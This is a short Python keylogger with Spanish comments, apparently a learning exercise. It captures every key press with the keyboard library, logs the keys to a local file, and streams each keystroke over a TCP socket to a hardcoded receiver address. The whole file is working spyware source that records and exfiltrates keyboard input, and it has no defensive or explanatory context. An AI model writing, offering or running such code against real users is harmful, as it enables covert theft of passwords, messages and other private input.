import keyboard
import os
import socket

def crear_socket_cliente():
    cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    cliente.connect(('172.23.209.22', 9999))  # IP del receptor (WSL)
    return cliente

def gestionar_fichero():
    if not os.path.exists('capturado.txt'):
        with open('capturado.txt', 'w', encoding='utf-8') as f:
            f.write("Estas son las teclas capturadas:\n")

def guardar_fichero(tecla, f, cliente_socket):
    if tecla == "space":
        tecla = " "
    elif tecla == "enter":
        tecla = "\n"
    elif len(tecla) > 2:
        tecla = f"|{tecla}|"

    f.write(tecla)
    f.flush()
    try:
        cliente_socket.send(tecla.encode('utf-8'))
    except Exception as e:
        print("Error al enviar:", e)

def capturar_teclas(cliente_socket):
    teclas_presionadas = []
    with open('capturado.txt', 'a', encoding='utf-8') as f:
        i = 0
        while i < 50:
            captura = keyboard.read_event()
            if captura.event_type == keyboard.KEY_DOWN:
                tecla = captura.name
                teclas_presionadas.append(tecla)
                print(''.join(teclas_presionadas))
                guardar_fichero(tecla, f, cliente_socket)
                i += 1

def main():
    gestionar_fichero()
    cliente_socket = crear_socket_cliente()
    try:
        while True:
            capturar_teclas(cliente_socket)
    finally:
        cliente_socket.close()

if __name__ == '__main__':
    main()
